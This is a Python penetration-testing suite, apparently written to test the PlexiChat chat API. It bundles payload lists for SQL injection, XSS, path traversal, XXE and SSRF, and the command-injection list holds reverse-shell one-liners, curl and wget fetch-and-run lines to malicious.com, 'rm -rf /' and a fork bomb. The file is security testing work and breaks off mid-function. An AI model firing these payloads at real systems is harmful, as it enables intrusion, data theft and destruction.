#!/usr/bin/env python3
"""
PlexiChat Advanced Penetration Testing Suite
Comprehensive security testing framework for PlexiChat API
Author: Security Team
Version: 2.0.0
"""

import requests
import time
import threading
import logging
import json
import hashlib
import secrets
import socket
import subprocess
import sys
import os
import re
import ssl
import urllib.parse
from typing import Dict, List, Any, Callable, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import uuid
import base64
import random
import string
from dataclasses import dataclass
from enum import Enum
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# CONFIGURATION & CONSTANTS
# =============================================================================

@dataclass
class TestConfig:
    base_url: str = 'http://localhost:8000'
    log_file: str = 'pentest_log.txt'
    report_file: str = 'pentest_report.json'
    max_threads: int = 100
    timeout: int = 30
    max_retries: int = 3
    delay_between_requests: float = 0.1
    user_agents: List[str] = None

    def __post_init__(self):
        if self.user_agents is None:
            self.user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'PentestBot/2.0 Security Testing Framework'
            ]

class TestType(Enum):
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INPUT_VALIDATION = "input_validation"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    RATE_LIMITING = "rate_limiting"
    FILE_UPLOAD = "file_upload"
    API_DISCOVERY = "api_discovery"
    BUSINESS_LOGIC = "business_logic"
    SESSION_MANAGEMENT = "session_management"
    ERROR_HANDLING = "error_handling"
    INFORMATION_DISCLOSURE = "information_disclosure"

class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

# =============================================================================
# ADVANCED PAYLOADS & ATTACK VECTORS
# =============================================================================

class PayloadLibrary:
    """Comprehensive payload library for various attack vectors"""

    @staticmethod
    def get_sql_injection_payloads() -> List[str]:
        return [
            "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1", "1\" OR \"1\"=\"1",
            "admin'--", "admin'#", "admin\"--", "admin\"#",
            "1' OR '1'='1' --", "1\" OR \"1\"=\"1\" --",
            "1' UNION SELECT NULL, NULL, NULL --", "1\" UNION SELECT NULL, NULL, NULL --",
            "'; DROP TABLE users; --", "\"; DROP TABLE users; --",
            "1' AND (SELECT * FROM users) --", "1\" AND (SELECT * FROM users) --",
            "1' AND 1=CONVERT(int, (SELECT @@version)) --",
            "1\" AND 1=CONVERT(int, (SELECT @@version)) --",
            "1' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
            "1\" AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
            "1' AND (SELECT * FROM information_schema.tables) --",
            "1\" AND (SELECT * FROM information_schema.tables) --",
            "' OR SLEEP(5) --", "\" OR SLEEP(5) --",
            "' OR pg_sleep(5) --", "\" OR pg_sleep(5) --",
            "' OR WAITFOR DELAY '0:0:5' --", "\" OR WAITFOR DELAY '0:0:5' --"
        ]

    @staticmethod
    def get_xss_payloads() -> List[str]:
        return [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>", "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>", "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>", "<video><source onerror=alert('XSS')>",
            "<audio><source onerror=alert('XSS')>", "<math href=javascript:alert('XSS')>CLICKME</math>",
            "<link rel=import href=data:text/html,<script>alert('XSS')</script>>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<form action=javascript:alert('XSS')><input type=submit>",
            "<button onclick=alert('XSS')>Click me</button>",
            "<a href=javascript:alert('XSS')>Click here</a>",
            "<img src=\"javascript:alert('XSS')\" alt=\"\">",
            "<div style=background:url(javascript:alert('XSS'))></div>",
            "<style>@import'javascript:alert(\"XSS\")';</style>"
        ]

    @staticmethod
    def get_command_injection_payloads() -> List[str]:
        return [
            "; cat /etc/passwd", "; ls -la", "; whoami", "; id",
            "| cat /etc/passwd", "| ls -la", "| whoami", "| id",
            "&& cat /etc/passwd", "&& ls -la", "&& whoami", "&& id",
            "`cat /etc/passwd`", "`ls -la`", "`whoami`", "`id`",
            "$(cat /etc/passwd)", "$(ls -la)", "$(whoami)", "$(id)",
            "; nc -e /bin/sh 127.0.0.1 4444", "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "; wget http://malicious.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh",
            "; curl http://malicious.com/shell.sh | sh",
            "; rm -rf /", "; :(){ :|:& };:", "; echo 'malicious' > /etc/passwd"
        ]

    @staticmethod
    def get_path_traversal_payloads() -> List[str]:
        return [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\SAM",
            "../../../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "....//....//....//....//....//....//....//....//....//etc/passwd"
        ]

    @staticmethod
    def get_xxe_payloads() -> List[str]:
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://malicious.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://malicious.com/xxe.dtd"> %xxe;]><foo>&xxe;</foo>'
        ]

    @staticmethod
    def get_ssrf_payloads() -> List[str]:
        return [
            "http://localhost:22", "http://127.0.0.1:22", "http://0.0.0.0:22",
            "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd", "file:///C:/windows/system32/drivers/etc/hosts",
            "ftp://localhost:21", "gopher://localhost:70", "dict://localhost:2628",
            "http://169.254.169.254/latest/user-data", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
        ]

# =============================================================================
# SECURITY TEST CASES
# =============================================================================

@dataclass
class TestResult:
    test_name: str
    test_type: TestType
    severity: Severity
    description: str
    evidence: Dict[str, Any]
    timestamp: datetime
    passed: bool
    vulnerability_found: bool = False

class SecurityTestSuite:
    """Comprehensive security test suite"""

    def __init__(self, config: TestConfig):
        self.config = config
        self.session = requests.Session()
        self.session.verify = False
        self.results: List[TestResult] = []
        self.auth_token = None
        self.user_id = None
        self.test_user = None

    def setup_logging(self):
        """Setup enhanced logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.config.log_file, mode='w'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        return logging.getLogger('SecurityTestSuite')

    def generate_test_user(self) -> Dict[str, str]:
        """Generate test user credentials"""
        timestamp = str(int(time.time()))
        return {
            'username': f'testuser_{timestamp}',
            'password': 'TestPass123!@#',
            'email': f'test_{timestamp}@pentest.local',
            'first_name': 'Test',
            'last_name': 'User'
        }

    def get_headers(self, auth: bool = True, custom_headers: Dict = None) -> Dict:
        headers = {
            'User-Agent': random.choice(self.config.user_agents),
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json'
        }
        if auth and self.auth_token:
            headers['Authorization'] = f'Bearer {self.auth_token}'
        if custom_headers:
            headers.update(custom_headers)
        return headers

    def make_request(self, method: str, endpoint: str, data: Dict = None, params: Dict = None,
                    auth: bool = True, expected_status: int = None, timeout: int = None) -> requests.Response:
        """Make HTTP request with retry logic"""
        url = f"{self.config.base_url}{endpoint}"
        headers = self.get_headers(auth)
        timeout = timeout or self.config.timeout

        for attempt in range(self.config.max_retries):
            try:
                response = self.session.request(
                    method=method,
                    url=url,
                    json=data,
                    params=params,
                    headers=headers,
                    timeout=timeout
                )

                if expected_status and response.status_code != expected_status:
                    time.sleep(self.config.delay_between_requests)
                    continue

                return response

            except requests.exceptions.RequestException as e:
                if attempt == self.config.max_retries - 1:
                    raise
                time.sleep(self.config.delay_between_requests * (attempt + 1))

    def add_result(self, test_name: str, test_type: TestType, severity: Severity,
                  description: str, evidence: Dict, passed: bool, vulnerability_found: bool = False):
        """Add test result"""
        result = TestResult(
            test_name=test_name,
            test_type=test_type,
            severity=severity,
            description=description,
            evidence=evidence,
            timestamp=datetime.now(),
            passed=passed,
            vulnerability_found=vulnerability_found
        )
        self.results.append(result)

    # =============================================================================
    # AUTHENTICATION TESTS
    # =============================================================================

    def test_authentication_bypass(self):
        """Test authentication bypass vulnerabilities"""
        test_name = "Authentication Bypass"

        # Test JWT token manipulation
        test_tokens = [
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.e30.",  # None algorithm
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.e30.",  # Invalid signature
            "null", "undefined", "", "Bearer ", "JWT ", "Token "
        ]

        for token in test_tokens:
            try:
                response = self.make_request('GET', '/auth/me', auth=False,
                                           custom_headers={'Authorization': f'Bearer {token}'})
                if response.status_code == 200:
                    self.add_result(
                        test_name, TestType.AUTHENTICATION, Severity.CRITICAL,
                        f"Authentication bypass with token: {token}",
                        {'token': token, 'response': response.text},
                        False, True
                    )
            except:
                pass

    def test_weak_password_policy(self):
        """Test weak password policy"""
        test_name = "Weak Password Policy"
        weak_passwords = [
            "123456", "password", "admin", "123", "test", "", " ", "a", "aa"
        ]

        for password in weak_passwords:
            try:
                user_data = self.generate_test_user()
                user_data['password'] = password
                response = self.make_request('POST', '/auth/register', data=user_data, auth=False)

                if response.status_code == 201:
                    self.add_result(
                        test_name, TestType.AUTHENTICATION, Severity.HIGH,
                        f"Weak password accepted: {password}",
                        {'password': password, 'response': response.text},
                        False, True
                    )
            except:
                pass

    def test_brute_force_protection(self):
        """Test brute force protection"""
        test_name = "Brute Force Protection"

        # Attempt multiple failed logins
        for i in range(20):
            try:
                login_data = {
                    'username': 'admin',
                    'password': f'wrong_password_{i}'
                }
                response = self.make_request('POST', '/auth/login', data=login_data, auth=False)

                if response.status_code == 429:  # Rate limited
                    self.add_result(
                        test_name, TestType.AUTHENTICATION, Severity.LOW,
                        "Rate limiting detected",
                        {'attempts': i, 'response': response.text},
                        True, False
                    )
                    return
            except:
                pass

    def test_session_management(self):
        """Test session management vulnerabilities"""
        test_name = "Session Management"

        # Test session fixation
        if self.auth_token:
            # Try to use token after logout
            self.make_request('POST', '/auth/logout')
            response = self.make_request('GET', '/auth/me')

            if response.status_code == 200:
                self.add_result(
                    test_name, TestType.SESSION_MANAGEMENT, Severity.HIGH,
                    "Session not invalidated after logout",
                    {'token': self.auth_token, 'response': response.text},
                    False, True
                )

    # =============================================================================
    # INPUT VALIDATION TESTS
    # =============================================================================

    def test_sql_injection(self):
        """Comprehensive SQL injection testing across all endpoints"""
        test_name = "SQL Injection"

        payloads = PayloadLibrary.get_sql_injection_payloads()

        # Extended payloads for comprehensive testing
        extended_payloads = payloads + [
            # Time-based blind SQL injection
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "1\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "1'; WAITFOR DELAY '00:00:05' --",
            "1\"; WAITFOR DELAY '00:00:05' --",

            # Boolean-based blind SQL injection
            "1' AND 1=1 --",
            "1' AND 1=2 --",
            "1\" AND 1=1 --",
            "1\" AND 1=2 --",

            # Union-based SQL injection
            "1' UNION SELECT NULL,NULL,NULL,NULL --",
            "1\" UNION SELECT NULL,NULL,NULL,NULL --",
            "1' UNION SELECT 1,2,3,4 --",
            "1\" UNION SELECT 1,2,3,4 --",

            # Error-based SQL injection
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "1\" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",

            # NoSQL injection
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$where': 'this.username == this.password'}",

            # Second-order SQL injection
            "admin'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --"
        ]

        # Test endpoints that might be vulnerable - use discovered endpoints
        endpoints_to_test = []

        # Add discovered endpoints with common vulnerable parameters
        discovered = getattr(self, 'discovered_endpoints', [])
        for endpoint in discovered:
            if any(pattern in endpoint for pattern in ['/search', '/users', '/messages', '/auth', '/admin']):
                # Test different parameter injection points
                endpoints_to_test.extend([
                    ('GET', endpoint, {'q': 'payload', 'search': 'payload', 'filter': 'payload', 'id': 'payload'}),
                    ('POST', endpoint, {'username': 'payload', 'email': 'test@test.com', 'password': 'test123'}),
                    ('PUT', endpoint, {'id': 'payload', 'data': 'payload'}),
                    ('DELETE', endpoint, {'id': 'payload'})
                ])

        # Fallback endpoints if discovery didn't work
        if not endpoints_to_test:
            endpoints_to_test = [
                ('GET', '/api/v1/users/search', {'q': 'payload'}),
                ('POST', '/api/v1/auth/login', {'username': 'payload', 'password': 'test'}),
                ('GET', '/api/v1/messages', {'search': 'payload'}),
                ('GET', '/api/v1/users', {'filter': 'payload', 'id': 'payload'}),
                ('POST', '/api/v1/users', {'username': 'payload', 'email': 'test@test.com', 'password': 'test123'}),
                ('GET', '/api/v1/admin/users', {'search': 'payload'}),
                ('GET', '/api/v1/system/info', {'param': 'payload'}),
                ('POST', '/api/v1/messages/send', {'content': 'payload', 'to': 'payload'}),
                ('GET', '/api/v1/files', {'filename': 'payload', 'path': 'payload'})
            ]

        for method, endpoint, base_data in endpoints_to_test:
            for payload in extended_payloads:
                try:
                    test_data = base_data.copy()

                    # Inject payload into all string parameters
                    for key in test_data:
                        if test_data[key] == 'payload':
                            test_data[key] = payload

                    # Measure response time for time-based detection
                    start_time = time.time()
                    response = self.make_request(method, endpoint, data=test_data, timeout=10)
                    response_time = time.time() - start_time

                    # Check for SQL error messages
                    error_indicators = [
                        'mysql', 'postgresql', 'sqlite', 'sql', 'syntax error', 'ora-',
                        'microsoft ole db', 'odbc', 'jdbc', 'warning:', 'error:',
                        'you have an error in your sql syntax', 'quoted string not properly terminated',
                        'unclosed quotation mark', 'invalid column name', 'table doesn\'t exist',
                        'unknown column', 'column count doesn\'t match', 'operand should contain'
                    ]

                    response_text = response.text.lower()

                    # Check for error-based SQL injection
                    for indicator in error_indicators:
                        if indicator in response_text:
                            self.add_result(
                                test_name, TestType.SQL_INJECTION, Severity.CRITICAL,
                                f"SQL injection vulnerability detected at {endpoint} (Error-based)",
                                {
                                    'payload': payload,
                                    'endpoint': endpoint,
                                    'method': method,
                                    'response_preview': response.text[:500],
                                    'error_indicator': indicator
                                },
                                False, True
                            )
                            break

                    # Check for time-based SQL injection (response time > 4 seconds)
                    if response_time > 4 and ('SLEEP' in payload.upper() or 'WAITFOR' in payload.upper()):
                        self.add_result(
                            test_name, TestType.SQL_INJECTION, Severity.CRITICAL,
                            f"Time-based SQL injection vulnerability at {endpoint}",
                            {
                                'payload': payload,
                                'endpoint': endpoint,
                                'method': method,
                                'response_time': response_time,
                                'expected_delay': 5
                            },
                            False, True
                        )

                    # Check for union-based SQL injection (different response structure)
                    if 'UNION' in payload.upper() and response.status_code == 200:
                        # Look for signs of successful union injection
                        if len(response.text) > 1000 or 'null' in response_text:
                            self.add_result(
                                test_name, TestType.SQL_INJECTION, Severity.HIGH,
                                f"Potential union-based SQL injection at {endpoint}",
                                {
                                    'payload': payload,
                                    'endpoint': endpoint,
                                    'method': method,
                                    'response_length': len(response.text)
                                },
                                False, True
                            )

                except Exception as e:
                    # Log timeout or connection errors which might indicate successful injection
                    if 'timeout' in str(e).lower():
                        self.add_result(
                            test_name, TestType.SQL_INJECTION, Severity.HIGH,
                            f"Potential time-based SQL injection (timeout) at {endpoint}",
                            {
                                'payload': payload,
                                'endpoint': endpoint,
                                'method': method,
                                'error': str(e)
                            },
                            False, True
                        )

    def test_xss_injection(self):
        """Comprehensive XSS vulnerability testing"""
        test_name = "Cross-Site Scripting (XSS)"

        payloads = PayloadLibrary.get_xss_payloads()

        # Extended XSS payloads for comprehensive testing
        extended_payloads = payloads + [
            # DOM-based XSS
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",

            # Attribute-based XSS
            "\" onmouseover=\"alert('XSS')\"",
            "' onmouseover='alert('XSS')'",
            "javascript:alert('XSS')",

            # Filter bypass techniques
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"javascript:alert('XSS')\">",
            "<img src=# onerror=alert('XSS')>",

            # Event handler XSS
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",

            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",

            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",

            # Template injection that could lead to XSS
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",

            # Markdown XSS
            "[XSS](javascript:alert('XSS'))",
            "![XSS](javascript:alert('XSS'))",

            # JSON XSS
            "{\"xss\":\"<script>alert('XSS')</script>\"}",

            # XML XSS
            "<?xml version=\"1.0\"?><root><script>alert('XSS')</script></root>"
        ]

        # Test endpoints that might be vulnerable - use discovered endpoints
        endpoints_to_test = []

        # Add discovered endpoints with common vulnerable parameters
        discovered = getattr(self, 'discovered_endpoints', [])
        for endpoint in discovered:
            if any(pattern in endpoint for pattern in ['/messages', '/users', '/posts', '/comments', '/search']):
                endpoints_to_test.extend([
                    ('POST', endpoint, {'content': 'payload', 'message': 'payload', 'text': 'payload'}),
                    ('PUT', endpoint, {'username': 'payload', 'bio': 'payload', 'description': 'payload'}),
                    ('GET', endpoint, {'q': 'payload', 'search': 'payload', 'query': 'payload'})
                ])

        # Fallback endpoints if discovery didn't work
        if not endpoints_to_test:
            endpoints_to_test = [
                ('POST', '/api/v1/messages/send', {'content': 'payload', 'to': 'test'}),
                ('PUT', '/api/v1/users/me', {'username': 'payload', 'display_name': 'payload'}),
                ('GET', '/api/v1/users/search', {'q': 'payload'}),
                ('GET', '/api/v1/messages', {'search': 'payload'}),
                ('POST', '/api/v1/auth/register', {'username': 'payload', 'email': 'test@test.com', 'password': 'test123'}),
                ('GET', '/api/v1/system/info', {'param': 'payload'}),
                ('POST', '/api/v1/files/upload', {'filename': 'payload', 'description': 'payload'})
            ]

        for method, endpoint, base_data in endpoints_to_test:
            for payload in extended_payloads:
                try:
                    test_data = base_data.copy()

                    # Inject payload into all string parameters
                    for key in test_data:
                        if test_data[key] == 'payload':
                            test_data[key] = payload

                    response = self.make_request(method, endpoint, data=test_data, timeout=10)

                    # Check if payload is reflected without proper encoding
                    if payload in response.text:
                        # Check if it's actually dangerous (not just reflected)
                        dangerous_patterns = ['<script', 'javascript:', 'onerror=', 'onload=', 'onclick=', 'onmouseover=']
                        if any(pattern.lower() in response.text.lower() for pattern in dangerous_patterns):
                            self.add_result(
                                test_name, TestType.XSS, Severity.HIGH,
                                f"Reflected XSS vulnerability at {endpoint}",
                                {
                                    'payload': payload,
                                    'endpoint': endpoint,
                                    'method': method,
                                    'response_preview': response.text[:500]
                                },
                                False, True
                            )

                    # Check for stored XSS by making a follow-up request
                    if method in ['POST', 'PUT'] and response.status_code in [200, 201]:
                        try:
                            # Try to retrieve the data to see if XSS payload is stored
                            get_response = self.make_request('GET', endpoint, timeout=5)
                            if payload in get_response.text:
                                dangerous_patterns = ['<script', 'javascript:', 'onerror=', 'onload=']
                                if any(pattern.lower() in get_response.text.lower() for pattern in dangerous_patterns):
                                    self.add_result(
                                        test_name, TestType.XSS, Severity.CRITICAL,
                                        f"Stored XSS vulnerability at {endpoint}",
                                        {
                                            'payload': payload,
                                            'endpoint': endpoint,
                                            'method': method,
                                            'stored_response_preview': get_response.text[:500]
                                        },
                                        False, True
                                    )
                        except:
                            pass

                    # Check for DOM XSS indicators
                    dom_indicators = ['document.write', 'innerHTML', 'outerHTML', 'eval(', 'setTimeout(', 'setInterval(']
                    response_text = response.text.lower()
                    for indicator in dom_indicators:
                        if indicator in response_text and payload.lower() in response_text:
                            self.add_result(
                                test_name, TestType.XSS, Severity.MEDIUM,
                                f"Potential DOM XSS vulnerability at {endpoint}",
                                {
                                    'payload': payload,
                                    'endpoint': endpoint,
                                    'method': method,
                                    'dom_indicator': indicator
                                },
                                False, True
                            )
                            break

                except Exception as e:
                    # Log any errors that might indicate successful XSS
                    pass

    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        test_name = "Command Injection"

        payloads = PayloadLibrary.get_command_injection_payloads()
        endpoints = [
            ('POST', '/files/upload', {'filename': 'payload.txt'}),
            ('GET', '/files/download', {'filename': 'payload'}),
            ('POST', '/system/exec', {'command': 'payload'})
        ]

        for method, endpoint, base_data in endpoints:
            for payload in payloads:
                try:
                    test_data = base_data.copy()
                    for key in test_data:
                        if test_data[key] == 'payload':
                            test_data[key] = payload

                    response = self.make_request(method, endpoint, data=test_data)

                    # Check for command execution indicators
                    indicators = ['root:', 'uid=', 'Windows IP', 'total ']
                    for indicator in indicators:
                        if indicator in response.text:
                            self.add_result(
                                test_name, TestType.INPUT_VALIDATION, Severity.CRITICAL,
                                f"Command injection vulnerability at {endpoint}",
                                {'payload': payload, 'endpoint': endpoint, 'response': response.text},
                                False, True
                            )
                            break

                except:
                    pass

    # =============================================================================
    # BUSINESS LOGIC TESTS
    # =============================================================================

    def test_privilege_escalation(self):
        """Test privilege escalation vulnerabilities"""
        test_name = "Privilege Escalation"

        if not self.auth_token:
            return

        # Test IDOR (Insecure Direct Object Reference)
        test_ids = [1, 2, 3, 999, 1000, 0, -1]

        for user_id in test_ids:
            try:
                response = self.make_request('GET', f'/users/{user_id}')

                if response.status_code == 200 and user_id != self.user_id:
                    user_data = response.json()
                    self.add_result(
                        test_name, TestType.AUTHORIZATION, Severity.HIGH,
                        f"IDOR vulnerability - accessing user {user_id}",
                        {'user_id': user_id, 'response_data': user_data},
                        False, True
                    )

            except:
                pass

    def test_mass_assignment(self):
        """Test mass assignment vulnerabilities"""
        test_name = "Mass Assignment"

        if not self.auth_token:
            return

        # Try to update admin fields
        malicious_data = {
            'username': 'testuser',
            'is_admin': True,
            'role': 'admin',
            'permissions': ['*'],
            'password_hash': 'malicious_hash',
            'created_at': '2020-01-01',
            'id': 1
        }

        try:
            response = self.make_request('PUT', '/users/me', data=malicious_data)

            if response.status_code == 200:
                user_data = response.json()
                if user_data.get('is_admin') or user_data.get('role') == 'admin':
                    self.add_result(
                        test_name, TestType.BUSINESS_LOGIC, Severity.HIGH,
                        "Mass assignment vulnerability detected",
                        {'payload': malicious_data, 'response': user_data},
                        False, True
                    )

        except:
            pass

    # =============================================================================
    # API DISCOVERY & FUZZING
    # =============================================================================

    def test_api_discovery(self):
        """Comprehensive API endpoint discovery based on actual PlexiChat structure"""
        test_name = "API Discovery"

        # PlexiChat-specific endpoints based on actual codebase analysis
        plexichat_endpoints = [
            # Root endpoints
            '/', '/health', '/docs', '/redoc',

            # API v1 endpoints
            '/api/v1', '/api/v1/auth', '/api/v1/users', '/api/v1/messages',
            '/api/v1/files', '/api/v1/admin', '/api/v1/system',
            '/api/v1/realtime', '/api/v1/groups', '/api/v1/search',
            '/api/v1/notifications',

            # Auth endpoints
            '/api/v1/auth/register', '/api/v1/auth/login', '/api/v1/auth/logout',
            '/api/v1/auth/me', '/api/v1/auth/status', '/api/v1/auth/2fa',

            # User endpoints
            '/api/v1/users/me', '/api/v1/users/search', '/api/v1/users/',

            # Message endpoints
            '/api/v1/messages/send', '/api/v1/messages/conversations',
            '/api/v1/messages/stats',

            # File endpoints
            '/api/v1/files/upload', '/api/v1/files/download',

            # Admin endpoints
            '/api/v1/admin/users', '/api/v1/admin/system', '/api/v1/admin/logs',

            # System endpoints
            '/api/v1/system/info', '/api/v1/system/health', '/api/v1/system/metrics',

            # Web interface endpoints
            '/web', '/auth', '/admin', '/users', '/messages', '/files',
            '/system', '/status', '/webhooks', '/ui', '/login', '/updates',
            '/cluster', '/database', '/file-management', '/ws',

            # Common security-sensitive endpoints
            '/admin', '/debug', '/dev', '/test', '/temp', '/backup',
            '/logs', '/metrics', '/config', '/env', '/environment',
            '/shell', '/console', '/terminal', '/uploads', '/media', '/static'
        ]

        discovered_endpoints = []

        for endpoint in plexichat_endpoints:
            try:
                response = self.make_request('GET', endpoint, expected_status=None, timeout=10)

                if response.status_code != 404:
                    discovered_endpoints.append(endpoint)
                    severity = Severity.INFO

                    # Flag potentially sensitive endpoints
                    sensitive_patterns = ['/admin', '/debug', '/dev', '/config', '/env', '/shell', '/console', '/backup']
                    if any(pattern in endpoint for pattern in sensitive_patterns):
                        severity = Severity.MEDIUM

                    self.add_result(
                        test_name, TestType.API_DISCOVERY, severity,
                        f"Discovered endpoint: {endpoint} (Status: {response.status_code})",
                        {
                            'endpoint': endpoint,
                            'status': response.status_code,
                            'response_length': len(response.text),
                            'content_type': response.headers.get('content-type', 'unknown'),
                            'response_preview': response.text[:200]
                        },
                        True, severity != Severity.INFO
                    )

            except Exception as e:
                # Log discovery failures for debugging
                pass

        # Store discovered endpoints for other tests
        self.discovered_endpoints = discovered_endpoints

        # Test for additional endpoints by analyzing responses
        self._discover_additional_endpoints()

    def _discover_additional_endpoints(self):
        """Discover additional endpoints by analyzing API responses"""
        test_name = "Advanced API Discovery"

        # Check for API documentation endpoints
        doc_endpoints = ['/openapi.json', '/swagger.json', '/api/docs', '/api/swagger']

        for endpoint in doc_endpoints:
            try:
                response = self.make_request('GET', endpoint, expected_status=None)
                if response.status_code == 200:
                    self.add_result(
                        test_name, TestType.API_DISCOVERY, Severity.INFO,
                        f"Found API documentation: {endpoint}",
                        {'endpoint': endpoint, 'content_type': response.headers.get('content-type')},
                        True, False
                    )

                    # Try to parse OpenAPI/Swagger spec for more endpoints
                    try:
                        if 'json' in response.headers.get('content-type', ''):
                            import json
                            spec = json.loads(response.text)
                            if 'paths' in spec:
                                for path in spec['paths'].keys():
                                    if path not in self.discovered_endpoints:
                                        self.discovered_endpoints.append(path)
                    except:
                        pass

            except:
                pass

    def test_http_methods(self):
        """Comprehensive HTTP method testing on all discovered endpoints"""
        test_name = "HTTP Method Testing"

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']

        # Use discovered endpoints or fallback to common ones
        endpoints_to_test = getattr(self, 'discovered_endpoints', [
            '/api/v1/users/me', '/api/v1/messages', '/api/v1/files', '/api/v1/admin',
            '/api/v1/auth/me', '/api/v1/system', '/', '/docs'
        ])

        for endpoint in endpoints_to_test:
            for method in methods:
                try:
                    response = self.make_request(method, endpoint, expected_status=None, timeout=10)

                    # Check for dangerous methods
                    if method in ['TRACE', 'CONNECT']:
                        if response.status_code not in [405, 501, 404]:
                            self.add_result(
                                test_name, TestType.INFORMATION_DISCLOSURE, Severity.HIGH,
                                f"Dangerous HTTP method allowed: {method} on {endpoint}",
                                {
                                    'method': method,
                                    'endpoint': endpoint,
                                    'status': response.status_code,
                                    'response': response.text[:200]
                                },
                                False, True
                            )

                    # Check for unexpected method allowances
                    elif method == 'OPTIONS' and response.status_code == 200:
                        # Check Allow header for method disclosure
                        allow_header = response.headers.get('Allow', '')
                        if 'TRACE' in allow_header or 'CONNECT' in allow_header:
                            self.add_result(
                                test_name, TestType.INFORMATION_DISCLOSURE, Severity.MEDIUM,
                                f"Dangerous methods advertised in OPTIONS: {allow_header} on {endpoint}",
                                {'method': method, 'endpoint': endpoint, 'allow_header': allow_header},
                                False, True
                            )

                    # Check for method override vulnerabilities
                    elif method == 'POST' and response.status_code == 200:
                        # Test HTTP method override headers
                        override_headers = [
                            'X-HTTP-Method-Override',
                            'X-HTTP-Method',
                            'X-Method-Override',
                            '_method'
                        ]

                        for override_header in override_headers:
                            try:
                                override_response = self.make_request(
                                    'POST', endpoint,
